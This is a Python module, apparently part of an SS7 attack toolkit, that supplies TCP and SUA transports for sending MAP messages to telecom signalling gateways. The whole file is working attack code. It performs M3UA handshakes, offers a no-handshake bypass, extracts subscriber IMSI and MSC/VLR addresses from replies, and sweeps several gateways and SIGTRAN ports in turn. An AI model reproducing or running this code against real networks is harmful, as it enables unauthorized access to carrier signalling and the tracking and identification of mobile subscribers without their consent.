#!/usr/bin/env python
"""
TCP-based M3UA Transport for SS7 attacks.
Provides TCP fallback when raw SCTP is not available (Windows, AWS, etc.).
Used by all SS7 attack modules as an alternative transport.
"""
import socket
import struct
import time


def build_m3ua_aspup():
    """M3UA ASP Up message."""
    return struct.pack('>BBBBI', 0x01, 0x00, 0x03, 0x01, 8)


def build_m3ua_aspactive():
    """M3UA ASP Active message."""
    return struct.pack('>BBBBI', 0x01, 0x00, 0x04, 0x01, 8)


def build_m3ua_data(sccp_payload, opc=1, dpc=2):
    """Wrap SCCP payload in M3UA DATA message."""
    # Protocol Data parameter header
    pd_header = struct.pack('>I', opc)      # OPC
    pd_header += struct.pack('>I', dpc)     # DPC
    pd_header += bytes([0x03])              # SI = SCCP(3)
    pd_header += bytes([0x02])              # NI = National(2)
    pd_header += bytes([0x00])              # MP = 0
    pd_header += bytes([0x00])              # SLS = 0
    pd_payload = pd_header + sccp_payload

    # M3UA param: tag=0x0210
    param_len = 4 + len(pd_payload)
    pad_len = (4 - (param_len % 4)) % 4
    m3ua_param = struct.pack('>HH', 0x0210, param_len) + pd_payload + (b'\x00' * pad_len)

    # M3UA header
    m3ua_msg_len = 8 + len(m3ua_param)
    m3ua_header = struct.pack('>BBBBI', 0x01, 0x00, 0x01, 0x01, m3ua_msg_len)

    return m3ua_header + m3ua_param


def build_sccp_udt(tcap_data, called_ssn=6, calling_ssn=8):
    """Build SCCP UDT (Unitdata) message."""
    called_addr = bytes([0x03, 0xC4, called_ssn & 0xFF])
    calling_addr = bytes([0x03, 0xC4, calling_ssn & 0xFF])

    ptr_called = 3
    ptr_calling = ptr_called + len(called_addr) + 1
    ptr_data = ptr_calling + len(calling_addr) + 1

    sccp_udt = bytes([0x09, 0x00, ptr_called, ptr_calling, ptr_data])
    sccp_udt += bytes([len(called_addr)]) + called_addr
    sccp_udt += bytes([len(calling_addr)]) + calling_addr
    sccp_udt += bytes([len(tcap_data)]) + tcap_data

    return sccp_udt


def encode_tbcd(number):
    """Encode phone number to TBCD format."""
    result = bytearray()
    if number.startswith('9'):
        result.append(0x91)
    else:
        result.append(0x81)
    for i in range(0, len(number), 2):
        if i + 1 < len(number):
            result.append(((int(number[i+1]) & 0x0F) << 4) | (int(number[i]) & 0x0F))
        else:
            result.append(0xF0 | (int(number[i]) & 0x0F))
    return bytes(result)


def decode_tbcd(data):
    """Decode TBCD-encoded digits."""
    digits = ''
    for b in data:
        low = b & 0x0F
        high = (b >> 4) & 0x0F
        if low < 10:
            digits += str(low)
        if high < 10 and high != 0x0F:
            digits += str(high)
    return digits


def parse_m3ua_response(data):
    """Parse M3UA response header."""
    if len(data) < 8:
        return None

    version = data[0]
    msg_class = data[2]
    msg_type = data[3]
    msg_len = struct.unpack('>I', data[4:8])[0]

    class_names = {0: 'MGMT', 1: 'Transfer', 2: 'SSNM', 3: 'ASPSM', 4: 'ASPTM'}
    type_names_map = {
        3: {1: 'ASP Up', 4: 'ASP Up Ack', 5: 'ASP Down Ack'},
        4: {1: 'ASP Active', 3: 'ASP Active Ack', 4: 'ASP Inactive Ack'},
        1: {1: 'DATA'},
        0: {0: 'Error', 1: 'Notify'},
    }

    class_name = class_names.get(msg_class, f'Class({msg_class})')
    type_name = type_names_map.get(msg_class, {}).get(msg_type, f'Type({msg_type})')

    return {
        'class': msg_class,
        'type': msg_type,
        'class_name': class_name,
        'type_name': type_name,
        'length': msg_len,
        'payload': data[8:msg_len] if msg_len > 8 else b'',
    }


def hexdump(data, prefix="    ", max_bytes=128):
    """Display hex dump of data."""
    for i in range(0, min(len(data), max_bytes), 16):
        hex_part = ' '.join(f'{b:02x}' for b in data[i:i+16])
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data[i:i+16])
        print(f"{prefix}{i:04x}: {hex_part:<48} {ascii_part}")
    if len(data) > max_bytes:
        print(f"{prefix}... ({len(data)} bytes total)")


def parse_map_error(data):
    """Extract MAP error information from response."""
    errors = {
        1: 'Unknown Subscriber', 5: 'Unidentified Subscriber',
        6: 'Absent Subscriber SM', 7: 'Unknown Equipment',
        9: 'Illegal Subscriber', 10: 'Bearer Service Not Provisioned',
        11: 'Teleservice Not Provisioned', 12: 'Illegal Equipment',
        21: 'Facility Not Supported', 27: 'Absent Subscriber',
        34: 'System Failure', 35: 'Data Missing',
        36: 'Unexpected Data Value', 51: 'Unauthorized Requesting Network',
    }

    for i in range(len(data)):
        if data[i] == 0xA3 and i + 4 < len(data):  # ReturnError component
            for j in range(i, min(i + 20, len(data))):
                if data[j] == 0x02 and j + 2 < len(data) and data[j+1] == 0x01:
                    code = data[j + 2]
                    return code, errors.get(code, f'Unknown({code})')
    return None, None


def extract_addresses(data):
    """Extract IMSI, MSC, VLR addresses from MAP response."""
    found = {}

    for i in range(len(data) - 6):
        tag = data[i]
        if i + 1 >= len(data):
            break
        length = data[i + 1]

        # IMSI (TBCD, 7-8 bytes, tag 0x04 or 0x80)
        if tag in (0x04, 0x80) and 6 <= length <= 9 and i + 2 + length <= len(data):
            possible = decode_tbcd(data[i+2:i+2+length])
            if len(possible) >= 14 and possible.isdigit() and 'imsi' not in found:
                found['imsi'] = possible

        # ISDN-AddressString (MSC/VLR numbers)
        if tag in (0x80, 0x81, 0x82, 0x83, 0x84, 0x04) and 4 <= length <= 10:
            if i + 2 + length <= len(data):
                val = data[i+2:i+2+length]
                if val and val[0] in (0x91, 0x81, 0xA1):
                    digits = decode_tbcd(val[1:])
                    if len(digits) >= 8:
                        ctx = tag & 0x1F
                        if ctx == 1 and 'msc' not in found:
                            found['msc'] = '+' + digits
                        elif ctx == 4 and 'vlr' not in found:
                            found['vlr'] = '+' + digits
                        elif f'addr_{ctx}' not in found:
                            found[f'addr_{ctx}'] = '+' + digits

    return found


class TCPTransport:
    """TCP-based transport for SS7/M3UA messages."""

    def __init__(self, remote_ip, remote_port=2905, opc=1, dpc=2, timeout=8):
        self.remote_ip = remote_ip
        self.remote_port = remote_port
        self.opc = opc
        self.dpc = dpc
        self.timeout = timeout
        self.sock = None
        self.connected = False
        self.asp_up = False
        self.asp_active = False

    def connect(self):
        """Establish TCP connection and M3UA handshake."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)

        # Step 1: TCP Connect
        print(f"\n[1] TCP -> {self.remote_ip}:{self.remote_port}")
        self.sock.connect((self.remote_ip, self.remote_port))
        self.connected = True
        print(f"    \033[32m[+] TCP connected\033[0m")

        # Step 2: M3UA ASP Up
        print(f"[2] M3UA ASP Up...")
        self.sock.send(build_m3ua_aspup())
        try:
            resp = self.sock.recv(4096)
            if resp:
                info = parse_m3ua_response(resp)
                if info:
                    print(f"    \033[32m[+] Response: {info['class_name']}/{info['type_name']}\033[0m")
                    if info['class'] == 3 and info['type'] == 4:
                        self.asp_up = True
                        print(f"    \033[32m[+] ASP Up Ack received!\033[0m")
        except socket.timeout:
            print(f"    \033[33m[!] No ASP Up response (timeout)\033[0m")

        # Step 3: M3UA ASP Active
        print(f"[3] M3UA ASP Active...")
        self.sock.send(build_m3ua_aspactive())
        try:
            resp = self.sock.recv(4096)
            if resp:
                info = parse_m3ua_response(resp)
                if info:
                    print(f"    \033[32m[+] Response: {info['class_name']}/{info['type_name']}\033[0m")
                    if info['class'] == 4 and info['type'] == 3:
                        self.asp_active = True
                        print(f"    \033[32m[+] ASP Active Ack! No authentication!\033[0m")
        except socket.timeout:
            print(f"    \033[33m[!] No ASP Active response (timeout)\033[0m")

        return self.connected

    def send_map(self, tcap_data, called_ssn=6, calling_ssn=8):
        """Send MAP message over M3UA/SCCP and return response."""
        if not self.connected:
            raise ConnectionError("Not connected")

        sccp = build_sccp_udt(tcap_data, called_ssn, calling_ssn)
        m3ua = build_m3ua_data(sccp, self.opc, self.dpc)

        print(f"[4] Sending MAP message ({len(m3ua)} bytes)...")
        hexdump(m3ua)
        self.sock.send(m3ua)

        # Wait for response
        print(f"[5] Waiting for response...")
        try:
            resp = self.sock.recv(8192)
            if resp:
                print(f"    \033[32m[+] {len(resp)} bytes received!\033[0m")
                hexdump(resp)

                info = parse_m3ua_response(resp)
                if info:
                    print(f"    M3UA: {info['class_name']}/{info['type_name']}")

                    if info['class'] == 1 and info['payload']:
                        # DATA message - contains SCCP/TCAP/MAP response
                        print(f"    \033[32m[+] M3UA DATA response!\033[0m")
                        return self._parse_response(info['payload'])

                    elif info['class'] == 0:
                        err_code, err_name = None, None
                        if info['payload'] and len(info['payload']) >= 8:
                            tag = struct.unpack('>HH', info['payload'][:4])
                            if tag[0] == 0x000C:
                                err_code = struct.unpack('>I', info['payload'][4:8])[0]
                        print(f"    \033[31m[-] M3UA Error: {err_code}\033[0m")
                        return {'success': False, 'error': f'M3UA Error: {err_code}'}

                return {'success': False, 'error': 'Unexpected response', 'raw': resp}
            else:
                print(f"    \033[31m[-] Empty response\033[0m")
                return {'success': False, 'error': 'Empty response'}

        except socket.timeout:
            print(f"    \033[31m[-] Timeout ({self.timeout}s)\033[0m")
            return {'success': False, 'error': 'Timeout'}
        except ConnectionResetError:
            print(f"    \033[31m[-] Connection reset by gateway\033[0m")
            return {'success': False, 'error': 'Connection reset'}

    def _parse_response(self, payload):
        """Parse SCCP/TCAP/MAP response payload."""
        result = {'success': False, 'raw': payload}

        # Check for TCAP messages
        for i in range(len(payload)):
            tag = payload[i]
            if tag == 0x64:  # TCAP End
                result['tcap'] = 'End'
                result['success'] = True
                break
            elif tag == 0x65:  # TCAP Continue
                result['tcap'] = 'Continue'
                result['success'] = True
                break
            elif tag == 0x67:  # TCAP Abort
                result['tcap'] = 'Abort'
                print(f"    \033[31m[-] TCAP Abort\033[0m")
                break

        # Extract MAP error
        err_code, err_name = parse_map_error(payload)
        if err_code is not None:
            result['map_error'] = err_code
            result['map_error_name'] = err_name
            print(f"    \033[31m[-] MAP Error: {err_code} ({err_name})\033[0m")

        # Extract addresses
        addrs = extract_addresses(payload)
        if addrs:
            result.update(addrs)
            for key, val in addrs.items():
                print(f"    \033[32m[+] {key.upper()}: {val}\033[0m")

        return result

    def close(self):
        """Close connection."""
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
            self.connected = False


def tcp_attack(remote_ip, remote_port, opc, dpc, tcap_data,
               called_ssn=6, calling_ssn=8, timeout=8):
    """
    Complete TCP-based SS7 attack.
    Convenience function used by all attack modules.
    """
    transport = TCPTransport(remote_ip, remote_port, opc, dpc, timeout)
    try:
        transport.connect()
        result = transport.send_map(tcap_data, called_ssn, calling_ssn)
        return result
    except socket.timeout:
        print(f"\033[31m[-] Connection timeout\033[0m")
        return {'success': False, 'error': 'Connection timeout'}
    except ConnectionRefusedError:
        print(f"\033[31m[-] Connection refused\033[0m")
        return {'success': False, 'error': 'Connection refused'}
    except ConnectionResetError:
        print(f"\033[31m[-] Connection reset by gateway\033[0m")
        return {'success': False, 'error': 'Connection reset'}
    except Exception as e:
        print(f"\033[31m[-] Error: {e}\033[0m")
        return {'success': False, 'error': str(e)}
    finally:
        transport.close()


def tcp_attack_nohandshake(remote_ip, remote_port, opc, dpc, tcap_data,
                           called_ssn=6, calling_ssn=8, timeout=5):
    """
    Send M3UA DATA directly without ASP Up/Active handshake.
    Some gateways process DATA messages without requiring handshake.
    """
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((remote_ip, remote_port))

        sccp = build_sccp_udt(tcap_data, called_ssn, calling_ssn)
        m3ua = build_m3ua_data(sccp, opc, dpc)

        sock.send(m3ua)

        try:
            resp = sock.recv(8192)
            if resp and len(resp) >= 8:
                info = parse_m3ua_response(resp)
                if info and info['class'] == 1:
                    return {'success': True, 'raw': resp, 'method': 'nohandshake'}
                elif info and info['class'] == 0:
                    return {'success': False, 'error': 'M3UA Error', 'method': 'nohandshake'}
                return {'success': True, 'raw': resp, 'method': 'nohandshake'}
            return {'success': False, 'error': 'No response', 'method': 'nohandshake'}
        except socket.timeout:
            return {'success': False, 'error': 'Timeout', 'method': 'nohandshake'}
    except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
        return {'success': False, 'error': str(e), 'method': 'nohandshake'}
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def build_sua_cldt(tcap_data, called_ssn=6, calling_ssn=8, opc=1, dpc=2):
    """
    Build SUA CLDT (Connectionless Data Transfer) message.
    SUA (SCCP User Adaptation) carries SCCP directly, different from M3UA.
    RFC 3868, Message class=7 (CL messages), type=1 (CLDT)
    """
    # Source Address param (tag=0x0102)
    src_addr = struct.pack('>HH', 0x8001, 8)  # Routing Context
    src_addr += struct.pack('>I', 1)
    # SSN indicator
    src_ssn = struct.pack('>HH', 0x8003, 8)  # SSN
    src_ssn += struct.pack('>I', calling_ssn)
    # Point Code
    src_pc = struct.pack('>HH', 0x8002, 8)  # PC
    src_pc += struct.pack('>I', opc)

    src_param = src_ssn + src_pc
    src_len = 4 + len(src_param)
    src_pad = (4 - (src_len % 4)) % 4
    source_address = struct.pack('>HH', 0x0102, src_len) + src_param + b'\x00' * src_pad

    # Destination Address param (tag=0x0103)
    dst_ssn = struct.pack('>HH', 0x8003, 8)
    dst_ssn += struct.pack('>I', called_ssn)
    dst_pc = struct.pack('>HH', 0x8002, 8)
    dst_pc += struct.pack('>I', dpc)

    dst_param = dst_ssn + dst_pc
    dst_len = 4 + len(dst_param)
    dst_pad = (4 - (dst_len % 4)) % 4
    dest_address = struct.pack('>HH', 0x0103, dst_len) + dst_param + b'\x00' * dst_pad

    # Protocol Class (tag=0x0105)
    proto_class = struct.pack('>HH', 0x0105, 8) + struct.pack('>I', 0)

    # Data param (tag=0x010B)
    data_len = 4 + len(tcap_data)
    data_pad = (4 - (data_len % 4)) % 4
    data_param = struct.pack('>HH', 0x010B, data_len) + tcap_data + b'\x00' * data_pad

    # CLDT body
    body = source_address + dest_address + proto_class + data_param

    # SUA header: version=1, reserved=0, class=7(CL), type=1(CLDT)
    msg_len = 8 + len(body)
    header = struct.pack('>BBBBI', 0x01, 0x00, 0x07, 0x01, msg_len)

    return header + body


def sua_attack(remote_ip, remote_port, opc, dpc, tcap_data,
               called_ssn=6, calling_ssn=8, timeout=5):
    """
    SUA (SCCP User Adaptation) attack on port 14001.
    Uses CLDT message to send SCCP/TCAP/MAP directly.
    """
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)

        print(f"\n[SUA] Connecting to {remote_ip}:{remote_port}...")
        sock.connect((remote_ip, remote_port))
        print(f"    \033[32m[+] TCP connected\033[0m")

        cldt = build_sua_cldt(tcap_data, called_ssn, calling_ssn, opc, dpc)
        print(f"[SUA] Sending CLDT ({len(cldt)} bytes)...")
        hexdump(cldt)
        sock.send(cldt)

        print(f"[SUA] Waiting for response...")
        try:
            resp = sock.recv(8192)
            if resp and len(resp) >= 8:
                print(f"    \033[32m[+] {len(resp)} bytes received!\033[0m")
                hexdump(resp)
                # Parse SUA response
                if len(resp) >= 4:
                    sua_class = resp[2]
                    sua_type = resp[3]
                    if sua_class == 0x07:  # CL message
                        return {'success': True, 'raw': resp, 'method': 'SUA'}
                    elif sua_class == 0x00:  # MGMT (error)
                        return {'success': False, 'error': 'SUA Error', 'raw': resp, 'method': 'SUA'}
                return {'success': True, 'raw': resp, 'method': 'SUA'}
            else:
                print(f"    \033[31m[-] No response\033[0m")
                return {'success': False, 'error': 'No response', 'method': 'SUA'}
        except socket.timeout:
            print(f"    \033[31m[-] Timeout\033[0m")
            return {'success': False, 'error': 'Timeout', 'method': 'SUA'}
    except ConnectionRefusedError:
        print(f"    \033[31m[-] Connection refused\033[0m")
        return {'success': False, 'error': 'Connection refused', 'method': 'SUA'}
    except ConnectionResetError:
        print(f"    \033[31m[-] Connection reset\033[0m")
        return {'success': False, 'error': 'Connection reset', 'method': 'SUA'}
    except Exception as e:
        print(f"    \033[31m[-] Error: {e}\033[0m")
        return {'success': False, 'error': str(e), 'method': 'SUA'}
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def multi_gateway_attack(targets, opc, dpc, tcap_data,
                         called_ssn=6, calling_ssn=8, timeout=4):
    """
    Attack multiple gateways in sequence with all methods.
    targets: list of (ip, port) tuples
    Returns list of results.
    """
    results = []
    total = len(targets)

    for idx, (ip, port) in enumerate(targets):
        print(f"\n{'='*60}")
        print(f" [{idx+1}/{total}] {ip}:{port}")
        print(f"{'='*60}")

        best_result = None

        # Method 1: Standard M3UA handshake
        print(f"\n  [Method 1] M3UA with handshake...")
        r1 = tcp_attack(ip, port, opc, dpc, tcap_data,
                        called_ssn, calling_ssn, timeout)
        if r1.get('success'):
            r1['ip'] = ip
            r1['port'] = port
            results.append(r1)
            print(f"  \033[32m[+] SUCCESS with standard M3UA!\033[0m")
            continue

        # Method 2: Direct DATA without handshake
        print(f"\n  [Method 2] M3UA DATA (no handshake)...")
        r2 = tcp_attack_nohandshake(ip, port, opc, dpc, tcap_data,
                                     called_ssn, calling_ssn, timeout)
        if r2.get('success'):
            r2['ip'] = ip
            r2['port'] = port
            results.append(r2)
            print(f"  \033[32m[+] SUCCESS with direct DATA!\033[0m")
            continue

        # Method 3: SUA on port 14001 (if different port)
        if port != 14001:
            print(f"\n  [Method 3] SUA on {ip}:14001...")
            r3 = sua_attack(ip, 14001, opc, dpc, tcap_data,
                           called_ssn, calling_ssn, timeout)
            if r3.get('success'):
                r3['ip'] = ip
                r3['port'] = 14001
                results.append(r3)
                print(f"  \033[32m[+] SUCCESS with SUA!\033[0m")
                continue

        # Method 4: Try other SIGTRAN ports
        for alt_port in [2904, 2906]:
            if alt_port != port:
                print(f"\n  [Method 4] M3UA DATA on {ip}:{alt_port}...")
                r4 = tcp_attack_nohandshake(ip, alt_port, opc, dpc, tcap_data,
                                             called_ssn, calling_ssn, timeout)
                if r4.get('success'):
                    r4['ip'] = ip
                    r4['port'] = alt_port
                    results.append(r4)
                    print(f"  \033[32m[+] SUCCESS on port {alt_port}!\033[0m")
                    break

        if not best_result and not any(r.get('ip') == ip for r in results):
            print(f"  \033[31m[-] All methods failed for {ip}\033[0m")

    return results
